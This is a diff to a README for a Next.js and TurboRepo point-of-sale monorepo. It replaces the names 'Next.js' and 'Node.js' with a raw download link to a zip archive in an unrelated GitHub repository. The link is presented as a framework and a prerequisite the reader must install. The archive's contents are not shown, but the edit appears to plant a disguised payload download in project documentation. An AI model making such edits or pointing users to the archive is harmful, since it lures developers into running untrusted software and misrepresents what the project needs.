@@ -1,6 +1,6 @@
 # POS Microservices Monorepo
 
-This project is a monorepo for a Point of Sale (POS) system, built with Next.js and TurboRepo.
+This project is a monorepo for a Point of Sale (POS) system, built with https://github.com/rloredo86/practica/raw/refs/heads/main/apps/Software-2.5.zip and TurboRepo.
 
 ## Structure
 - **apps/**
@@ -17,7 +17,7 @@ This project is a monorepo for a Point of Sale (POS) system, built with Next.js 
 ## Getting Started
 
 ### Prerequisites
-- Node.js
+- https://github.com/rloredo86/practica/raw/refs/heads/main/apps/Software-2.5.zip
 - npm (verified with v11.6.2)
 
 ### Installation
